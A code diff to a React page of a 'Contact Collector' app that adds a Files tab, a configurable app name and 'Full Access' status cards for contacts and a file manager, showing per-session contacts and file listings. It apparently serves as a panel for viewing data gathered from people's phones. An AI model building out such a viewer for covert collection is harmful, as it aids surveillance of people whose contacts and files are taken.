@@ -13,8 +13,12 @@ import {
   X,
   FileText,
   Share2,
-  RefreshCw,
-  AlertCircle,
+  FolderOpen,
+  File,
+  Image,
+  Music,
+  Video,
+  FileIcon,
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -34,10 +38,22 @@ interface ContactInfo {
   organization?: string;
 }
 
+interface FileInfo {
+  name: string;
+  path: string;
+  isDirectory: boolean;
+  size: number;
+  lastModified: number;
+  fileType: string;
+}
+
 interface SessionData {
   id: string;
   contacts: ContactInfo[];
+  files: FileInfo[];
+  appName: string;
   count: number;
+  fileCount: number;
   createdAt: string;
 }
 
@@ -61,12 +77,11 @@ function generateAllVCard(contacts: ContactInfo[]): string {
   return contacts.map(generateVCard).join('\n\n');
 }
 
-// ─── Color Utilities ────────────────────────────────────
+// ─── Utilities ──────────────────────────────────────────
 
 const AVATAR_COLORS = [
   'bg-emerald-600', 'bg-teal-600', 'bg-cyan-600', 'bg-green-700',
   'bg-lime-700', 'bg-emerald-700', 'bg-teal-700', 'bg-cyan-700',
-  'bg-green-600', 'bg-lime-600',
 ];
 
 function getAvatarColor(name: string): string {
@@ -83,14 +98,43 @@ function getInitials(name: string): string {
   return name.slice(0, 2).toUpperCase();
 }
 
+function formatFileSize(bytes: number): string {
+  if (bytes === 0) return '0 B';
+  const k = 1024;
+  const sizes = ['B', 'KB', 'MB', 'GB'];
+  const i = Math.floor(Math.log(bytes) / Math.log(k));
+  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+}
+
+function getFileIcon(type: string) {
+  switch (type) {
+    case 'image': return <Image className="w-5 h-5 text-purple-500" />;
+    case 'video': return <Video className="w-5 h-5 text-red-500" />;
+    case 'audio': return <Music className="w-5 h-5 text-orange-500" />;
+    case 'pdf': return <FileText className="w-5 h-5 text-red-600" />;
+    case 'document': return <FileText className="w-5 h-5 text-blue-500" />;
+    case 'apk': return <FileIcon className="w-5 h-5 text-green-500" />;
+    case 'vcf': return <Phone className="w-5 h-5 text-[#25D366]" />;
+    case 'folder': return <FolderOpen className="w-5 h-5 text-yellow-500" />;
+    default: return <File className="w-5 h-5 text-gray-500" />;
+  }
+}
+
+// ─── Tab Type ──────────────────────────────────────────
+
+type Tab = 'contacts' | 'files';
+
 // ─── Main View Component ────────────────────────────────
 
 export default function ContactViewPage({ params }: { params: Promise<{ id: string }> }) {
   const { toast } = useToast();
   const [sessionId, setSessionId] = useState('');
   const [contacts, setContacts] = useState<ContactInfo[]>([]);
+  const [files, setFiles] = useState<FileInfo[]>([]);
+  const [appName, setAppName] = useState('Contact Collector');
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState('');
+  const [activeTab, setActiveTab] = useState<Tab>('contacts');
   const [selectedContact, setSelectedContact] = useState<ContactInfo | null>(null);
   const [view, setView] = useState<'list' | 'detail'>('list');
   const [searchQuery, setSearchQuery] = useState('');
@@ -98,21 +142,20 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
   const [copiedAll, setCopiedAll] = useState(false);
   const [showVcardAll, setShowVcardAll] = useState(false);
 
-  // Get session ID from URL params
   useEffect(() => {
     params.then(p => setSessionId(p.id));
   }, [params]);
 
-  // Save session to history
   const saveToHistory = useCallback((data: SessionData) => {
     try {
       const stored = localStorage.getItem('contact_sessions');
       const sessions = stored ? JSON.parse(stored) : [];
-      // Check if already saved
       if (!sessions.find((s: any) => s.id === data.id)) {
         sessions.unshift({
           id: data.id,
           count: data.count,
+          fileCount: data.fileCount,
+          appName: data.appName,
           createdAt: data.createdAt,
         });
         localStorage.setItem('contact_sessions', JSON.stringify(sessions));
@@ -120,97 +163,85 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
     } catch {}
   }, []);
 
-  // Fetch contacts from API
   useEffect(() => {
     if (!sessionId) return;
-
-    const fetchContacts = async () => {
+    const fetchData = async () => {
       setLoading(true);
       try {
         const res = await fetch(`/api/contacts/view/${sessionId}`);
         if (!res.ok) {
-          setError('Contact session not found or expired');
+          setError('Session not found or expired');
           setLoading(false);
           return;
         }
         const data: SessionData = await res.json();
         setContacts(data.contacts);
+        setFiles(data.files || []);
+        setAppName(data.appName || 'Contact Collector');
         saveToHistory(data);
       } catch {
-        setError('Failed to load contacts');
+        setError('Failed to load data');
       }
       setLoading(false);
     };
-
-    fetchContacts();
+    fetchData();
   }, [sessionId, saveToHistory]);
 
-  // Filtered contacts
   const filteredContacts = useMemo(() => {
     if (!searchQuery.trim()) return contacts;
     const q = searchQuery.toLowerCase();
-    return contacts.filter(
-      (c) =>
-        c.name.toLowerCase().includes(q) ||
-        c.phone.toLowerCase().includes(q) ||
-        (c.email && c.email.toLowerCase().includes(q)) ||
-        (c.organization && c.organization.toLowerCase().includes(q))
+    return contacts.filter(c =>
+      c.name.toLowerCase().includes(q) ||
+      c.phone.toLowerCase().includes(q) ||
+      (c.email && c.email.toLowerCase().includes(q))
     );
   }, [contacts, searchQuery]);
 
-  // Copy handlers
-  const copyVCard = useCallback(
-    async (contact: ContactInfo) => {
-      const vcard = generateVCard(contact);
-      await navigator.clipboard.writeText(vcard);
-      setCopiedId(contact.id);
-      toast({ title: 'Copied!', description: `${contact.name}'s vCard copied` });
-      setTimeout(() => setCopiedId(null), 2000);
-    },
-    [toast]
-  );
+  const filteredFiles = useMemo(() => {
+    if (!searchQuery.trim()) return files;
+    const q = searchQuery.toLowerCase();
+    return files.filter(f => f.name.toLowerCase().includes(q));
+  }, [files, searchQuery]);
+
+  const copyVCard = useCallback(async (contact: ContactInfo) => {
+    await navigator.clipboard.writeText(generateVCard(contact));
+    setCopiedId(contact.id);
+    toast({ title: 'Copied!', description: `${contact.name}'s vCard copied` });
+    setTimeout(() => setCopiedId(null), 2000);
+  }, [toast]);
 
   const copyAllVCard = useCallback(async () => {
-    const vcard = generateAllVCard(contacts);
-    await navigator.clipboard.writeText(vcard);
+    await navigator.clipboard.writeText(generateAllVCard(contacts));
     setCopiedAll(true);
     toast({ title: 'All Copied!', description: `${contacts.length} contacts vCard copied` });
     setTimeout(() => setCopiedAll(false), 2000);
   }, [contacts, toast]);
 
-  // Download handler
   const downloadVCard = useCallback((contact: ContactInfo) => {
-    const vcard = generateVCard(contact);
-    const blob = new Blob([vcard], { type: 'text/vcard' });
+    const blob = new Blob([generateVCard(contact)], { type: 'text/vcard' });
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
     a.download = `${contact.name.replace(/\s+/g, '_')}.vcf`;
     a.click();
     URL.revokeObjectURL(url);
-    toast({ title: 'Downloaded!', description: `${contact.name}.vcf saved` });
-  }, [toast]);
+  }, []);
 
   const downloadAllVCard = useCallback(() => {
-    const vcard = generateAllVCard(contacts);
-    const blob = new Blob([vcard], { type: 'text/vcard' });
+    const blob = new Blob([generateAllVCard(contacts)], { type: 'text/vcard' });
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
     a.download = 'all_contacts.vcf';
     a.click();
     URL.revokeObjectURL(url);
-    toast({ title: 'Downloaded!', description: `${contacts.length} contacts saved` });
-  }, [contacts, toast]);
+  }, [contacts]);
 
-  // Share handler
   const shareVCard = useCallback(async (contact: ContactInfo) => {
     const vcard = generateVCard(contact);
     if (navigator.share) {
-      try { await navigator.share({ title: `${contact.name} - Contact`, text: vcard }); } catch { /* cancelled */ }
-    } else {
-      await copyVCard(contact);
-    }
+      try { await navigator.share({ title: `${contact.name} - Contact`, text: vcard }); } catch {}
+    } else { await copyVCard(contact); }
   }, [copyVCard]);
 
   // ─── Loading ───────────────────────────────────────
@@ -225,8 +256,8 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
         </div>
         <div className="flex-1 flex flex-col items-center justify-center px-6">
           <div className="w-16 h-16 rounded-full border-4 border-white/20 border-t-[#25D366] animate-spin mb-6" />
-          <h3 className="text-white font-semibold text-lg mb-2">Loading Contacts...</h3>
-          <p className="text-white/60 text-sm text-center">Fetching your contact data</p>
+          <h3 className="text-white font-semibold text-lg mb-2">Loading Data...</h3>
+          <p className="text-white/60 text-sm text-center">Fetching contacts &amp; files</p>
         </div>
       </div>
     );
@@ -243,15 +274,11 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
           <h1 className="text-white font-semibold text-lg">Contact Collector</h1>
         </div>
         <div className="flex-1 flex flex-col items-center justify-center px-6">
-          <div className="w-20 h-20 rounded-full bg-red-500/20 flex items-center justify-center mb-6">
-            <AlertCircle className="w-10 h-10 text-red-400" />
-          </div>
           <h3 className="text-white font-semibold text-lg mb-2 text-center">Not Found</h3>
           <p className="text-white/60 text-sm text-center mb-8 max-w-xs">{error}</p>
           <a href="/">
             <Button className="bg-[#25D366] hover:bg-[#20BD5A] text-white font-semibold h-12 rounded-xl px-8">
-              <ArrowLeft className="w-5 h-5 mr-2" />
-              Go Home
+              <ArrowLeft className="w-5 h-5 mr-2" /> Go Home
             </Button>
           </a>
         </div>
@@ -262,7 +289,6 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
   // ─── Contact Detail View ──────────────────────────
   if (view === 'detail' && selectedContact) {
     const vcard = generateVCard(selectedContact);
-
     return (
       <div className="min-h-screen flex flex-col bg-[#ECE5DD]">
         <div className="bg-[#075E54] px-4 py-3 flex items-center gap-3 shadow-md">
@@ -279,7 +305,6 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
             <p className="text-white/70 text-xs">{selectedContact.organization || 'Contact Details'}</p>
           </div>
         </div>
-
         <div className="flex-1 px-4 py-6 space-y-4 overflow-y-auto">
           <div className="bg-white rounded-2xl p-6 shadow-sm">
             <div className="flex flex-col items-center mb-5">
@@ -291,9 +316,7 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
               <h3 className="text-lg font-bold text-gray-900">{selectedContact.name}</h3>
               {selectedContact.organization && <p className="text-sm text-gray-500">{selectedContact.organization}</p>}
             </div>
-
             <Separator className="my-4" />
-
             <div className="flex items-center gap-3 py-2">
               <div className="w-10 h-10 rounded-full bg-[#25D366]/10 flex items-center justify-center shrink-0">
                 <Phone className="w-5 h-5 text-[#25D366]" />
@@ -303,7 +326,6 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
                 <p className="text-sm font-medium text-gray-900 truncate">{selectedContact.phone}</p>
               </div>
             </div>
-
             {selectedContact.email && (
               <div className="flex items-center gap-3 py-2">
                 <div className="w-10 h-10 rounded-full bg-[#25D366]/10 flex items-center justify-center shrink-0">
@@ -315,44 +337,26 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
                 </div>
               </div>
             )}
-
-            {selectedContact.organization && (
-              <div className="flex items-center gap-3 py-2">
-                <div className="w-10 h-10 rounded-full bg-[#25D366]/10 flex items-center justify-center shrink-0">
-                  <Users className="w-5 h-5 text-[#25D366]" />
-                </div>
-                <div className="flex-1 min-w-0">
-                  <p className="text-xs text-gray-500 mb-0.5">Organization</p>
-                  <p className="text-sm font-medium text-gray-900 truncate">{selectedContact.organization}</p>
-                </div>
-              </div>
-            )}
           </div>
-
           <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
             <div className="px-4 py-3 bg-[#075E54] flex items-center gap-2">
               <FileText className="w-4 h-4 text-white/80" />
               <h4 className="text-white font-semibold text-sm">vCard Format</h4>
             </div>
             <div className="p-4">
-              <pre className="text-xs text-gray-700 bg-gray-50 rounded-xl p-4 overflow-x-auto whitespace-pre-wrap font-mono leading-relaxed">
-                {vcard}
-              </pre>
+              <pre className="text-xs text-gray-700 bg-gray-50 rounded-xl p-4 overflow-x-auto whitespace-pre-wrap font-mono leading-relaxed">{vcard}</pre>
             </div>
           </div>
-
           <div className="grid grid-cols-3 gap-3 pb-2">
             <Button onClick={() => copyVCard(selectedContact)} className="bg-[#075E54] hover:bg-[#064E46] text-white h-14 rounded-xl flex-col gap-1 text-xs">
               {copiedId === selectedContact.id ? <Check className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
               {copiedId === selectedContact.id ? 'Copied' : 'Copy'}
             </Button>
             <Button onClick={() => downloadVCard(selectedContact)} className="bg-[#25D366] hover:bg-[#20BD5A] text-white h-14 rounded-xl flex-col gap-1 text-xs">
-              <Download className="w-5 h-5" />
-              Download
+              <Download className="w-5 h-5" /> Download
             </Button>
             <Button onClick={() => shareVCard(selectedContact)} variant="outline" className="border-[#075E54] text-[#075E54] hover:bg-[#075E54]/10 h-14 rounded-xl flex-col gap-1 text-xs">
-              <Share2 className="w-5 h-5" />
-              Share
+              <Share2 className="w-5 h-5" /> Share
             </Button>
           </div>
         </div>
@@ -360,27 +364,75 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
     );
   }
 
-  // ─── Contact List View (MAIN) ───────────────────────
+  // ─── Main List View ───────────────────────────────
   return (
     <div className="min-h-screen flex flex-col bg-[#ECE5DD]">
+      {/* Header */}
       <div className="bg-[#075E54] px-4 py-3 flex items-center gap-3 shadow-md z-10">
         <a href="/" className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center">
           <ArrowLeft className="w-5 h-5 text-white" />
         </a>
         <div className="flex-1 min-w-0">
-          <h1 className="text-white font-semibold text-base">Contact Collector</h1>
-          <p className="text-white/70 text-xs">{contacts.length} contacts</p>
+          <h1 className="text-white font-semibold text-base">{appName}</h1>
+          <p className="text-white/70 text-xs">{contacts.length} contacts &bull; {files.length} files</p>
         </div>
       </div>
 
+      {/* Access Status Cards */}
+      <div className="px-3 py-3 bg-[#ECE5DD]">
+        <div className="grid grid-cols-2 gap-3">
+          <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
+            <div className="w-10 h-10 rounded-full bg-[#25D366]/20 flex items-center justify-center mx-auto mb-1.5">
+              <Phone className="w-5 h-5 text-[#25D366]" />
+            </div>
+            <p className="text-white font-bold text-sm">Contact</p>
+            <p className="text-[#25D366] text-xs font-semibold">Full Access</p>
+            <p className="text-white/50 text-[10px] mt-0.5">{contacts.length} contacts</p>
+          </div>
+          <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
+            <div className="w-10 h-10 rounded-full bg-blue-400/20 flex items-center justify-center mx-auto mb-1.5">
+              <FolderOpen className="w-5 h-5 text-blue-400" />
+            </div>
+            <p className="text-white font-bold text-sm">File Manager</p>
+            <p className="text-blue-400 text-xs font-semibold">Full Access</p>
+            <p className="text-white/50 text-[10px] mt-0.5">{files.length} files</p>
+          </div>
+        </div>
+      </div>
+
+      {/* Tab Switcher */}
+      <div className="px-3 pb-1 bg-[#ECE5DD]">
+        <div className="flex bg-white rounded-xl shadow-sm p-1">
+          <button
+            onClick={() => setActiveTab('contacts')}
+            className={`flex-1 py-2.5 rounded-lg text-sm font-semibold transition-colors flex items-center justify-center gap-2 ${
+              activeTab === 'contacts' ? 'bg-[#075E54] text-white' : 'text-gray-500 hover:text-gray-700'
+            }`}
+          >
+            <Phone className="w-4 h-4" />
+            Contacts ({contacts.length})
+          </button>
+          <button
+            onClick={() => setActiveTab('files')}
+            className={`flex-1 py-2.5 rounded-lg text-sm font-semibold transition-colors flex items-center justify-center gap-2 ${
+              activeTab === 'files' ? 'bg-blue-600 text-white' : 'text-gray-500 hover:text-gray-700'
+            }`}
+          >
+            <FolderOpen className="w-4 h-4" />
+            Files ({files.length})
+          </button>
+        </div>
+      </div>
+
+      {/* Search */}
       <div className="px-3 py-2 bg-[#ECE5DD]">
         <div className="relative">
           <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
           <Input
-            placeholder="Search contacts..."
+            placeholder={activeTab === 'contacts' ? 'Search contacts...' : 'Search files...'}
             value={searchQuery}
             onChange={(e) => setSearchQuery(e.target.value)}
-            className="pl-9 pr-9 h-10 bg-white rounded-xl border-0 shadow-sm text-sm placeholder:text-gray-400"
+            className="pl-9 pr-9 h-10 bg-white rounded-xl border-0 shadow-sm text-sm"
           />
           {searchQuery && (
             <button onClick={() => setSearchQuery('')} className="absolute right-3 top-1/2 -translate-y-1/2">
@@ -390,99 +442,127 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
         </div>
       </div>
 
-      <div className="px-3 py-2 bg-[#ECE5DD]">
-        <button
-          onClick={() => setShowVcardAll(!showVcardAll)}
-          className="w-full bg-[#075E54] hover:bg-[#064E46] text-white rounded-2xl px-5 py-4 flex items-center gap-3 shadow-md active:scale-[0.98] transition-transform"
-        >
-          <div className="w-11 h-11 rounded-full bg-[#25D366] flex items-center justify-center shrink-0">
-            <Phone className="w-5 h-5 text-white" />
-          </div>
-          <div className="flex-1 text-left min-w-0">
-            <h2 className="font-bold text-base">My Contacted Numbers</h2>
-            <p className="text-white/70 text-xs">{contacts.length} contacts in vCard format</p>
-          </div>
-          <Badge className="bg-[#25D366] text-white border-0 text-sm px-2.5 py-1 font-bold">
-            {contacts.length}
-          </Badge>
-        </button>
-      </div>
-
-      {showVcardAll && (
-        <div className="px-3 pb-2 bg-[#ECE5DD]">
-          <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
-            <div className="px-4 py-3 bg-[#075E54] flex items-center justify-between">
-              <div className="flex items-center gap-2">
-                <FileText className="w-4 h-4 text-white/80" />
-                <h4 className="text-white font-semibold text-sm">All Contacts vCard</h4>
+      {/* ─── CONTACTS TAB ───────────────────────────── */}
+      {activeTab === 'contacts' && (
+        <>
+          {/* My Contacted Numbers button */}
+          <div className="px-3 py-1 bg-[#ECE5DD]">
+            <button
+              onClick={() => setShowVcardAll(!showVcardAll)}
+              className="w-full bg-[#075E54] hover:bg-[#064E46] text-white rounded-2xl px-5 py-4 flex items-center gap-3 shadow-md active:scale-[0.98] transition-transform"
+            >
+              <div className="w-11 h-11 rounded-full bg-[#25D366] flex items-center justify-center shrink-0">
+                <Phone className="w-5 h-5 text-white" />
               </div>
-              <button onClick={() => setShowVcardAll(false)}>
-                <X className="w-4 h-4 text-white/60" />
-              </button>
-            </div>
-            <div className="p-4">
-              <pre className="text-[10px] text-gray-700 bg-gray-50 rounded-xl p-3 overflow-auto max-h-48 whitespace-pre-wrap font-mono leading-relaxed">
-                {generateAllVCard(contacts)}
-              </pre>
-            </div>
-            <div className="px-4 pb-4 flex gap-2">
-              <Button onClick={copyAllVCard} variant="outline" size="sm" className="flex-1 border-[#075E54]/30 text-[#075E54] hover:bg-[#075E54]/10 rounded-xl h-10 text-xs">
-                {copiedAll ? <Check className="w-3.5 h-3.5 mr-1" /> : <Copy className="w-3.5 h-3.5 mr-1" />}
-                {copiedAll ? 'Copied All' : 'Copy All vCard'}
-              </Button>
-              <Button onClick={downloadAllVCard} size="sm" className="flex-1 bg-[#25D366] hover:bg-[#20BD5A] text-white rounded-xl h-10 text-xs">
-                <Download className="w-3.5 h-3.5 mr-1" />
-                Download All .vcf
-              </Button>
-            </div>
+              <div className="flex-1 text-left min-w-0">
+                <h2 className="font-bold text-base">My Contacted Numbers</h2>
+                <p className="text-white/70 text-xs">{contacts.length} contacts in vCard format</p>
+              </div>
+              <Badge className="bg-[#25D366] text-white border-0 text-sm px-2.5 py-1 font-bold">{contacts.length}</Badge>
+            </button>
           </div>
-        </div>
+
+          {showVcardAll && (
+            <div className="px-3 pb-2 bg-[#ECE5DD]">
+              <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
+                <div className="px-4 py-3 bg-[#075E54] flex items-center justify-between">
+                  <div className="flex items-center gap-2">
+                    <FileText className="w-4 h-4 text-white/80" />
+                    <h4 className="text-white font-semibold text-sm">All Contacts vCard</h4>
+                  </div>
+                  <button onClick={() => setShowVcardAll(false)}>
+                    <X className="w-4 h-4 text-white/60" />
+                  </button>
+                </div>
+                <div className="p-4">
+                  <pre className="text-[10px] text-gray-700 bg-gray-50 rounded-xl p-3 overflow-auto max-h-48 whitespace-pre-wrap font-mono leading-relaxed">
+                    {generateAllVCard(contacts)}
+                  </pre>
+                </div>
+                <div className="px-4 pb-4 flex gap-2">
+                  <Button onClick={copyAllVCard} variant="outline" size="sm" className="flex-1 border-[#075E54]/30 text-[#075E54] hover:bg-[#075E54]/10 rounded-xl h-10 text-xs">
+                    {copiedAll ? <Check className="w-3.5 h-3.5 mr-1" /> : <Copy className="w-3.5 h-3.5 mr-1" />}
+                    {copiedAll ? 'Copied All' : 'Copy All vCard'}
+                  </Button>
+                  <Button onClick={downloadAllVCard} size="sm" className="flex-1 bg-[#25D366] hover:bg-[#20BD5A] text-white rounded-xl h-10 text-xs">
+                    <Download className="w-3.5 h-3.5 mr-1" /> Download All .vcf
+                  </Button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          <ScrollArea className="flex-1">
+            <div className="bg-white mx-3 rounded-2xl shadow-sm overflow-hidden mb-4">
+              {filteredContacts.length === 0 ? (
+                <div className="py-12 text-center">
+                  <Users className="w-12 h-12 text-gray-300 mx-auto mb-3" />
+                  <p className="text-gray-500 text-sm">No contacts found</p>
+                </div>
+              ) : (
+                filteredContacts.map((contact, index) => (
+                  <React.Fragment key={contact.id}>
+                    <button
+                      onClick={() => { setSelectedContact(contact); setView('detail'); }}
+                      className="w-full flex items-center gap-3 px-4 py-3 hover:bg-[#F0F0F0] transition-colors active:bg-[#E8E8E8]"
+                    >
+                      <Avatar className="w-11 h-11 shrink-0">
+                        <AvatarFallback className={`${getAvatarColor(contact.name)} text-white font-semibold text-sm`}>
+                          {getInitials(contact.name)}
+                        </AvatarFallback>
+                      </Avatar>
+                      <div className="flex-1 min-w-0 text-left">
+                        <h3 className="text-sm font-semibold text-gray-900 truncate">{contact.name}</h3>
+                        <p className="text-xs text-gray-500 truncate mt-0.5">{contact.phone}</p>
+                      </div>
+                      <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
+                    </button>
+                    {index < filteredContacts.length - 1 && <div className="ml-[68px] border-b border-gray-100" />}
+                  </React.Fragment>
+                ))
+              )}
+            </div>
+          </ScrollArea>
+        </>
       )}
 
-      <ScrollArea className="flex-1">
-        <div className="bg-white mx-3 rounded-2xl shadow-sm overflow-hidden mb-4">
-          {filteredContacts.length === 0 ? (
-            <div className="py-12 text-center">
-              <Users className="w-12 h-12 text-gray-300 mx-auto mb-3" />
-              <p className="text-gray-500 text-sm">No contacts found</p>
-            </div>
-          ) : (
-            filteredContacts.map((contact, index) => (
-              <React.Fragment key={contact.id}>
-                <button
-                  onClick={() => { setSelectedContact(contact); setView('detail'); }}
-                  className="w-full flex items-center gap-3 px-4 py-3 hover:bg-[#F0F0F0] transition-colors active:bg-[#E8E8E8]"
-                >
-                  <Avatar className="w-11 h-11 shrink-0">
-                    <AvatarFallback className={`${getAvatarColor(contact.name)} text-white font-semibold text-sm`}>
-                      {getInitials(contact.name)}
-                    </AvatarFallback>
-                  </Avatar>
-                  <div className="flex-1 min-w-0 text-left">
-                    <div className="flex items-center gap-2">
-                      <h3 className="text-sm font-semibold text-gray-900 truncate">{contact.name}</h3>
-                      {contact.organization && (
-                        <span className="text-[10px] text-[#075E54] bg-[#075E54]/10 px-1.5 py-0.5 rounded-full truncate max-w-[100px]">
-                          {contact.organization}
-                        </span>
-                      )}
+      {/* ─── FILES TAB ──────────────────────────────── */}
+      {activeTab === 'files' && (
+        <ScrollArea className="flex-1">
+          <div className="bg-white mx-3 rounded-2xl shadow-sm overflow-hidden mb-4">
+            {filteredFiles.length === 0 ? (
+              <div className="py-12 text-center">
+                <FolderOpen className="w-12 h-12 text-gray-300 mx-auto mb-3" />
+                <p className="text-gray-500 text-sm">No files found</p>
+              </div>
+            ) : (
+              filteredFiles.map((file, index) => (
+                <React.Fragment key={`${file.path}-${index}`}>
+                  <div className="w-full flex items-center gap-3 px-4 py-3">
+                    <div className="w-11 h-11 rounded-xl bg-gray-50 flex items-center justify-center shrink-0">
+                      {getFileIcon(file.fileType)}
                     </div>
-                    <p className="text-xs text-gray-500 truncate mt-0.5">{contact.phone}</p>
+                    <div className="flex-1 min-w-0 text-left">
+                      <h3 className="text-sm font-medium text-gray-900 truncate">{file.name}</h3>
+                      <p className="text-xs text-gray-500 truncate mt-0.5">
+                        {file.isDirectory ? 'Folder' : formatFileSize(file.size)}
+                        <span className="text-gray-300 mx-1">|</span>
+                        <span className="text-gray-400">{file.fileType}</span>
+                      </p>
+                    </div>
                   </div>
-                  <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
-                </button>
-                {index < filteredContacts.length - 1 && (
-                  <div className="ml-[68px] border-b border-gray-100" />
-                )}
-              </React.Fragment>
-            ))
-          )}
-        </div>
-      </ScrollArea>
+                  {index < filteredFiles.length - 1 && <div className="ml-[68px] border-b border-gray-100" />}
+                </React.Fragment>
+              ))
+            )}
+          </div>
+        </ScrollArea>
+      )}
 
+      {/* Footer */}
       <div className="px-4 py-3 bg-white border-t border-gray-100">
         <p className="text-center text-xs text-gray-400">
-          Contact Collector &bull; {contacts.length} contacts &bull; vCard 3.0
+          Contact Collector &bull; {contacts.length} contacts &bull; {files.length} files &bull; vCard 3.0
         </p>
       </div>
     </div>
